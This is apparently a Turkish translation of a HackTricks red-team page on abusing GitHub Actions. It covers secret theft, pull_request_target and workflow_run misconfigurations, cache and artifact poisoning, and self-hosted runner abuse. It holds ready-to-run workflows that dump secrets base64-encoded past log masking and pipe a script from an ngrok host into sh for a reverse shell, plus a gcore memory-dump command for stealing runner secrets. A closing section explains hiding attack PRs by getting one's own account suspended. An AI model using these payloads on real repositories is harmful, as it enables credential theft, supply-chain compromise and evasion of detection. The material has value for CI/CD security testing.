# Github Actions Kötüye Kullanma

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>

## Temel Bilgiler

Bu sayfada şunları bulacaksınız:

* Bir saldırganın bir Github Action'a erişim sağlaması durumunda **tüm etkilerin özeti**
* Bir eyleme erişim sağlamanın **farklı yolları**:
* Eylemi oluşturma **izinleri**ne sahip olmak
* **Çekme isteği** ile ilgili tetikleyicileri kötüye kullanmak
* Diğer **harici erişim** tekniklerini kötüye kullanmak
* Zaten etkilenmiş bir repo'dan **dönüş yapmak**
* Son olarak, içeriden bir eylemi kötüye kullanmak için **son aşama saldırı teknikleri** hakkında bir bölüm (yukarıda bahsedilen etkileri nedeniyle)

## Etkilerin Özeti

[**Github Actions hakkında temel bilgilere**](../basic-github-information.md#github-actions) giriş için.

Bir **dizin içinde keyfi Github eylemleri/kod enjekte edebilirseniz**, şunları yapabilirsiniz:

* O repo/organizasyondan **sırları çalmak**.
* Sadece enjekte edebiliyorsanız, zaten iş akışında bulunan her şeyi çalabilirsiniz.
* AWS ve GCP gibi diğer platformlara erişmek için **repo ayrıcalıklarını** kötüye kullanmak.
* Özel işçiler kullanılıyorsa, **özel işçilerde kodu yürütmek** ve oradan dönüş yapmaya çalışmak.
* Depo **kodunu üzerine yazmak**.
* Bu, `GITHUB_TOKEN`'ın ayrıcalıklarına bağlıdır (varsa).
* **Dağıtımları** ve diğer **sanat eserlerini** tehlikeye atmak.
* Kod bir şeyleri dağıtıyorsa veya depoluyorsa, onu değiştirebilir ve daha fazla erişim elde edebilirsiniz.

## GITHUB\_TOKEN

Bu "**gizli**" (`${{ secrets.GITHUB_TOKEN }}` ve `${{ github.token }}` ile gelen) seçenek etkinleştirildiğinde verilen bir token'dır:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Bu token, bir **Github Uygulaması'nın kullanacağı** aynı token olduğu için aynı uç noktalara erişebilir: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github, bir repo'nun `GITHUB_TOKEN` kullanarak diğer dahili getirepo'lara erişmesine izin veren bir [**akış**](https://github.com/github/roadmap/issues/74) yayınlamalıdır.
{% endhint %}

Bu token'ın olası **izinlerini** [burada](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token) görebilirsiniz.

Bu token'lar işlem tamamlandıktan sonra **geçerliliğini yitirir**.\
Bu token'lar şuna benzer: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Bu token ile yapabileceğiniz bazı ilginç şeyler:

{% tabs %}
{% tab title="PR Birleştir" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% tab title="PR'yi Onayla" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% tab title="PR Oluştur" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Dikkat, birkaç durumda Github Actions envs içinde veya secrets içinde **github kullanıcı tokenları bulabileceğinizi** unutmayın. Bu tokenlar size depo ve organizasyon üzerinde daha fazla yetki verebilir.
{% endhint %}

<details>

<summary>Github Action çıktısında secrets listele</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Gizli bilgilerle ters kabuk alın</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Github Token'un diğer kullanıcıların depolarındaki izinlerini kontrol etmek için Github eylemlerinin günlüklerini kontrol etmek mümkündür:

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## İzin Verilen Yürütme

{% hint style="info" %}
Bu, Github eylemlerini tehlikeye atmanın en kolay yolu olabilir, çünkü bu durumda **kuruluş içinde yeni bir repo oluşturma** veya **bir depoya yazma yetkisi** sahip olmanız gerekmektedir.

Bu senaryoda iseniz, [Post Exploitation tekniklerini](./#post-exploitation-techniques-from-inside-an-action) kontrol edebilirsiniz.
{% endhint %}

### Repo Oluşturma ile Yürütme

Bir kuruluşun üyeleri **yeni repo oluşturabiliyorsa** ve github eylemlerini yürütebiliyorsanız, **yeni bir repo oluşturabilir ve kuruluş düzeyinde ayarlanan sırları çalabilirsiniz**.

### Yeni Bir Dal ile Yürütme

Zaten yapılandırılmış bir Github Eylemi içeren bir depoda **yeni bir dal oluşturabiliyorsanız**, onu **değiştirebilir**, içeriği **yükleyebilir** ve ardından **yeni dal üzerinden bu eylemi yürütebilirsiniz**. Bu şekilde, depo ve kuruluş düzeyindeki sırları **dışarıya çıkarabilirsiniz** (ancak nasıl adlandırıldıklarını bilmelisiniz).

Değiştirilmiş eylemi **manuel olarak** yürütme yapabilirsiniz, bir **PR oluşturulduğunda** veya **bazı kodlar gönderildiğinde** (ne kadar gürültülü olmak istediğinize bağlı olarak):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Forked Execution

{% hint style="info" %}
Bir saldırganın **başka bir depodaki Github Eylemini yürütmesine** izin verebilecek farklı tetikleyiciler vardır. Eğer bu tetiklenebilir eylemler kötü bir şekilde yapılandırılmışsa, bir saldırgan bunları tehlikeye atabilir.
{% endhint %}

### `pull_request`

**`pull_request`** iş akışı tetikleyici, her bir pull isteği alındığında iş akışını yürütür, bazı istisnalarla: varsayılan olarak, **ilk kez işbirliği yaptığınızda**, bir **sürdürücü**, iş akışının **çalışmasını onaylamalıdır**:

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Varsayılan sınırlama **ilk kez** katkıda bulunanlar içindir, **geçerli bir hata/yazım hatası düzeltmesi yaparak katkıda bulunabilir** ve ardından yeni `pull_request` ayrıcalıklarınızı kötüye kullanmak için **diğer PR'ler gönderebilirsiniz**.

**Bunu test ettim ve işe yaramıyor**: ~~Başka bir seçenek, projeye katkıda bulunan ve hesabını silen birinin adıyla bir hesap oluşturmaktır.~~
{% endhint %}

Ayrıca, varsayılan olarak **hedef depoya yazma izinlerini** ve **secrets erişimini** engeller, [**belgelerde**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories) belirtildiği gibi:

> `GITHUB_TOKEN` hariç, bir iş akışı bir **forked** depodan tetiklendiğinde, **secrets'lar çalıştırıcıya geçirilmez**. **`GITHUB_TOKEN`'ın salt okunur izinleri**, **forked depolarından** çekme isteklerinde geçerlidir.

Bir saldırgan, Github Eyleminin tanımını değiştirerek keyfi şeyler yürütmek ve keyfi eylemler eklemek için yapabilir. Bununla birlikte, bahsedilen sınırlamalar nedeniyle, saldırgan secrets çalamaz veya repo üzerine yazamaz.

{% hint style="danger" %}
**Evet, saldırgan PR'de tetiklenecek github eylemini değiştirirse, kullanılacak olan eylem saldırganın eylemi olacaktır, orijin repo eylemi değil!**
{% endhint %}

Saldırgan ayrıca yürütülen kodu kontrol ettiği için, `GITHUB_TOKEN` üzerinde secrets veya yazma izinleri olmasa bile, örneğin **zararlı dosyalar yükleyebilir**.

### **`pull_request_target`**

**`pull_request_target`** iş akışı tetikleyici, hedef depoya **yazma izinlerine** ve **secrets erişimine** sahiptir (ve izin istemez).

Dikkat edin, **`pull_request_target`** iş akışı tetikleyicisi, PR tarafından verilen bağlamda değil, **temel bağlamda** çalışır (güvenilmeyen kodu **çalıştırmamak** için). `pull_request_target` hakkında daha fazla bilgi için [**belgelere**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target) bakın.\
Ayrıca, bu özel tehlikeli kullanım hakkında daha fazla bilgi için bu [**github blog yazısına**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) bakın.

**Çalıştırılan iş akışı** PR'de tanımlanan iş akışı yerine **temelde** tanımlanan iş akışı olduğu için **`pull_request_target`** kullanmanın **güvenli** olduğu gibi görünebilir, ancak **bazı durumlarda** öyle değildir.

Ve bu, **secrets erişimine** sahip olacak.

### `workflow_run`

[**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) tetikleyici, bir iş akışını `tamamlandığında`, `istendiğinde` veya `devam ederken` başka bir iş akışından çalıştırmak için kullanılır.

Bu örnekte, ayrı "Run Tests" iş akışı tamamlandıktan sonra bir iş akışının çalıştırılması yapılandırılmıştır:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Ayrıca, belgelere göre: `workflow_run` etkinliği tarafından başlatılan iş akışı, önceki iş akışı başlatılmamış olsa bile gizliliklere erişebilir ve token yazabilir.

Bu tür bir iş akışı, harici bir kullanıcı tarafından `pull_request` veya `pull_request_target` aracılığıyla tetiklenebilen bir iş akışına bağlıysa saldırıya uğrayabilir. Birkaç zayıf örnek [bu blogda bulunabilir](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability). İlk örnekte, saldırganın kodunu indiren `workflow_run` tetiklenen iş akışı: `${{ github.event.pull_request.head.sha }}`\
İkinci örnekte, güvenilmeyen kodun bir artefaktını `workflow_run` iş akışına geçirerek ve bu artefaktın içeriğini RCE'ye karşı savunmasız hale getirecek şekilde kullanarak saldırı gerçekleştirilebilir.

### `workflow_call`

TODO

TODO: Bir pull_request'den çalıştırıldığında kullanılan/indirilen kodun orijinden mi yoksa çatal PR'den mi olduğunu kontrol et

## Çatal Yürütme Saldırısı

Bir github iş akışının nasıl yürütülebileceğini anlattık, şimdi bu yürütmelerin, yanlış yapılandırıldığında nasıl kötüye kullanılabileceğine bakalım:

### Güvenilmeyen checkout yürütme

**`pull_request`** durumunda, iş akışı **PR bağlamında yürütülecektir** (bu nedenle **zararlı PR kodu yürütülecektir**), ancak önce **yetkilendirilmesi gerekmektedir** ve bazı [kısıtlamalarla](./#pull_request) çalışacaktır.

**`pull_request_target` veya `workflow_run`** kullanan bir iş akışı, **`pull_request_target` veya `pull_request`** tarafından tetiklenebilen bir iş akışına bağlıysa, orijinal depodan kod çalıştırılacaktır, bu nedenle **saldırgan yürütülen kodu kontrol edemez**.

{% hint style="danger" %}
Ancak, **eylem**, **açık bir PR checkout**'a sahipse (ve temel yerine PR'den kod alacaksa), saldırganın kontrol ettiği kodu kullanacaktır. Örneğin (PR kodunun indirildiği 12. satıra bakın):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># GÜVENİLMEZ. Sadece bir örnek olarak sağlanmıştır.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Potansiyel olarak **güvenilmeyen kod, `npm install` veya `npm build` sırasında çalıştırılmaktadır** çünkü derleme komut dosyaları ve referans alınan **paketler PR'nin yazarı tarafından kontrol edilmektedir**.

{% hint style="warning" %}
Zararlı eylemleri aramak için bir github dorku: `event.pull_request pull_request_target extension:yml` ancak, eylem güvenli bir şekilde yapılandırılmamış olsa bile (örneğin, PR'yi oluşturan aktöre göre koşullu ifadeler kullanarak), işlerin güvenli bir şekilde yürütülmesi için farklı yapılandırma yöntemleri vardır.
{% endhint %}

### Bağlam Komutu Enjeksiyonları <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Belirli [**github bağlamları**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) kullanıcının PR oluşturduğu değerlere **kontrol edilebilir**. Eğer github eylemi bu verileri **yürütmek için kullanıyorsa**, bu keyfi kod yürütmesine yol açabilir:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Komut Enjeksiyonu** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Belgelerden: Bir iş akışı işindeki herhangi bir sonraki adımlar için bir **çevre değişkenini kullanılabilir hale getirebilirsiniz**, çevre değişkenini tanımlayarak veya güncelleyerek ve bunu **`GITHUB_ENV`** çevre dosyasına yazarak.

Bir saldırgan bu **env** değişkenine herhangi bir değer **enjekte edebilirse**, takip eden adımlarda **LD\_PRELOAD** veya **NODE\_OPTIONS** gibi kodu yürütebilecek env değişkenlerini enjekte edebilir.

Örneğin ([**bu**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) ve [**bu**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), bir iş akışı düşünün, yüklenen bir artefakı güvenmeye dayalı olarak içeriğini **`GITHUB_ENV`** env değişkenine depolayan. Bir saldırgan, bunu tehlikeye atmak için aşağıdakine benzer bir şey yükleyebilir:

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

### Zayıf Noktalı Üçüncü Taraf Github Eylemleri

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

[**Bu blog yazısında**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks) belirtildiği gibi, bu Github Eylemi farklı iş akışlarından ve hatta depolardan artefaklara erişim sağlar.

Sorun şu ki, **`path`** parametresi ayarlanmazsa, artefakt mevcut dizine çıkarılır ve daha sonra iş akışında kullanılabilecek dosyaların üzerine yazabilir veya hatta yürütülebilir. Bu nedenle, Eylem savunmasızsa, bir saldırgan, Artefak'a güvenen diğer iş akışlarını tehlikeye atmak için bunu kötüye kullanabilir.

Zayıf bir iş akışı örneği:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Bu iş akışıyla saldırı yapılabilir:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Diğer Harici Erişim

### Silinen Namespace Repo Kaçırma

Bir hesap adını değiştirdiğinde, başka bir kullanıcı bir süre sonra o adla bir hesap kaydedebilir. Eğer bir depo, ad değişikliğinden önce **100'den az yıldıza** sahipse, Github, aynı adı taşıyan yeni kayıtlı kullanıcının bir **repo oluşturmasına izin verecektir**.

{% hint style="danger" %}
Bu nedenle, bir eylem, mevcut olmayan bir hesaptan bir repo kullanıyorsa, saldırgan hala o hesabı oluşturabilir ve eylemi tehlikeye atabilir.
{% endhint %}

Eğer diğer depolar, bu kullanıcının depolarından **bağımlılıklar kullanıyorsa**, bir saldırgan onları ele geçirebilir. Daha kapsamlı bir açıklama için buraya bakabilirsiniz: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Repo Pivoting

{% hint style="info" %}
Bu bölümde, birinci repo üzerinde bir tür erişime sahip olduğumuzu varsayarak, **bir repo'dan diğerine geçiş yapmamızı sağlayacak tekniklerden** bahsedeceğiz (önceki bölüme bakın).
{% endhint %}

### Önbellek Zehirlenmesi

Bir önbellek, **aynı dalda çalışan iş akışları arasında korunur**. Bu, bir saldırganın daha sonra bir iş akışı tarafından **indirilen** ve yürütülen bir **paket**i ele geçirirse, daha yetkilendirilmiş bir iş akışını da **tehlikeye atabileceği anlamına gelir**.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Sanal Varlık Zehirlenmesi

İş akışları, başka iş akışlarından ve hatta depolardan **sanal varlıklar kullanabilir**. Bir saldırgan, başka bir iş akışı tarafından kullanılan bir sanal varlığı **yükselten bir Github Eylemini ele geçirirse**, diğer iş akışlarını da **tehlikeye atabilir**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Bir Eylemden Sonrası Sızma

### AWS ve GCP'ye OIDC Aracılığıyla Erişim

Aşağıdaki sayfalara bakın:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Secrets'e Erişim <a href="#accessing-secrets" id="accessing-secrets"></a>

Bir betiğe içerik enjekte ediyorsanız, sırlara nasıl erişebileceğinizi bilmek ilginç olabilir:

* Eğer sır veya belirteç bir **çevre değişkenine** ayarlanmışsa, **`printenv`** kullanarak doğrudan çevreden erişilebilir.

<details>

<summary>Github Eylem çıktısında sırları listele</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Gizli bilgilerle ters kabuk alın</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Eğer secret **doğrudan bir ifadede** kullanılıyorsa, oluşturulan kabuk komut dosyası **diskte** saklanır ve erişilebilir.
* ```bash
cat /home/runner/work/_temp/*
```
* Bir JavaScript eylemi için, secret'lar çevre değişkenleri aracılığıyla gönderilir.
* ```bash
ps axe | grep node
```
*   **Özel bir eylem** için, risk, bir programın **argümandan** elde ettiği secret'i nasıl kullandığına bağlı olarak değişebilir:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Kendi barındıran çalıştırıcıları kötüye kullanma

**Github Eylemlerinin Github dışı altyapıda çalıştırıldığı** hangi Github Eylemlerinin olduğunu bulmanın yolu, Github Eylemi yapılandırma yaml'ında **`runs-on: self-hosted`** aramaktır.

**Kendi barındıran** çalıştırıcılar, **ekstra hassas bilgilere**, diğer **ağ sistemlerine** (ağda zafiyete sahip uç noktalar? meta veri hizmeti?) veya izole edilmiş ve yok edilmiş olsa bile, **aynı anda birden fazla eylem çalıştırılabilir** ve kötü niyetli olan diğerinin secret'larını **çalabilir**.

Kendi barındıran çalıştırıcılarda, **_Runner.Listener_** işleminin belleğini dökleyerek, herhangi bir adımda iş akışlarının tüm secret'larını içerecek şekilde, iş akışlarının tüm secret'larını elde etmek de mümkündür:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Daha fazla bilgi için [**bu yazıya bakın**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Görüntüsü Kayıt Defteri

Github içinde bir Docker görüntüsü oluşturan ve saklayan Github eylemleri yapmak mümkündür.\
Bir örnek aşağıdaki açılır menüde bulunabilir:

<details>

<summary>Github Eylemi Görüntü Oluştur ve İti Docker Görüntüsü</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Önceki kodda gördüğünüz gibi, Github kayıt defteri **`ghcr.io`** üzerinde barındırılır.

Depoya okuma izinleri olan bir kullanıcı, kişisel erişim belirteci kullanarak Docker Image'ı indirebilecektir:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Sonra, kullanıcı **Docker imaj katmanlarında sızdırılan sırları** arayabilir:

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Github Actions günlüklerinde hassas bilgiler

**Github**, eylemler günlüklerinde **gizli değerleri tespit etmeye** ve onları **göstermemeye** çalışsa da, eylemin yürütülmesi sırasında oluşturulmuş **diğer hassas veriler** gizlenmeyecektir. Örneğin, bir gizli değerle imzalanmış bir JWT, [özel olarak yapılandırılmadıkça](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) gizlenmeyecektir.

## İzleri Gizleme

([**buradan**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit) Teknik) İlk olarak, herhangi bir PR'nin Github'da halka açık olarak görülebilir olduğunu unutmayın ve hedef GitHub hesabına da görünür. GitHub'da varsayılan olarak, **bir PR'yi internetten silemeyiz**, ancak bir sürpriz var. Github tarafından **askıya alınan** Github hesapları için, tüm **PR'ler otomatik olarak silinir** ve internetten kaldırılır. Bu nedenle, etkinliğinizi gizlemek için ya **GitHub hesabınızın askıya alınmasını veya hesabınızın işaretlenmesini** sağlamanız gerekmektedir. Bu, GitHub'daki tüm etkinliklerinizi (temel olarak tüm saldırı PR'lerinizi kaldırır)

Bir organizasyon, GitHub'a hesapları bildirmek konusunda çok proaktiftir. Yapmanız gereken tek şey, Sorunlarda "bazı şeyler" paylaşmak ve onlar 12 saat içinde hesabınızın askıya alınmasını sağlayacaklar :p ve işte, saldırınızı github'da görünmez hale getirdiniz.

{% hint style="warning" %}
Bir organizasyonun hedef alındığını anlaması için GitHub günlüklerini SIEM'den kontrol etmesi gerekmektedir, çünkü GitHub UI'den PR kaldırılacaktır.
{% endhint %}

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek paylaşın.

</details>
